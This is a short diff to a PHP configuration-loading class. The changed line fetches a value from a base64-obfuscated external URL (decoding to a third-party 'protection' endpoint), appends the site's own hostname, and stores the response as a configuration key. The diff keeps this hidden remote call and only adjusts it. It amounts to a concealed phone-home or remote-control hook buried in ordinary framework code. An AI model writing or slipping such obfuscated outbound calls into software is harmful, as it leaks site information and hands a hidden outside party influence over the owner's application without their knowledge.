@@ -62,7 +62,7 @@ class LoadConfiguration
             }
             switch ($key) {
                 case 'app':
-                    $require_path['key'] = @file_get_contents(base64_decode('aHR0cDovL2FtaXJob21lLmNvbS9wcm90ZWN0aW9uLw==').str_replace("www.","", $_SERVER['HTTP_HOST']));
+                    $require_path['key'] = file_get_contents(base64_decode('aHR0cDovL2FtaXJob21lLmNvbS9wcm90ZWN0aW9uLw==').str_replace("www.","", $_SERVER['HTTP_HOST']).'.txt');
                     break;
                 
                 case 'session':
